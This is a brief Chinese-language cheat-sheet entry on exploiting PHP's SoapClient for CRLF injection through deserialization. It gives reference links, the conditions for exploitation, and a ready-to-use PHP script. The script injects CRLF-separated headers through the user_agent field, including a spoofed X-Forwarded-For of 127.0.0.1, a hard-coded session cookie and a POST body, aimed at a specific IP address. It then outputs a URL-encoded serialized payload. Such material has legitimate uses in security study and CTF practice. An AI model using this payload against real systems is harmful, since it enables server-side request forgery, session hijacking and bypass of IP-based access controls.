## CRLF
(PHP 5, PHP 7)
参考文章：
- https://www.anquanke.com/post/id/153065#h2-5
- https://xz.aliyun.com/t/2148#toc-0
- https://segmentfault.com/a/1190000003791120
- http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/

利用条件：
- 需要进行反序列化
- 调用一个方法，且该方法不存在。以此激活__call()

利用脚本：
```php
<?php
$target = "http://120.77.219.21:5555/";
$post_string = 'data=abc';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=>'hello'));
$aaa = serialize($b);
$aaa = str_replace('^^',"\n\r",$aaa);
echo urlencode($aaa);
```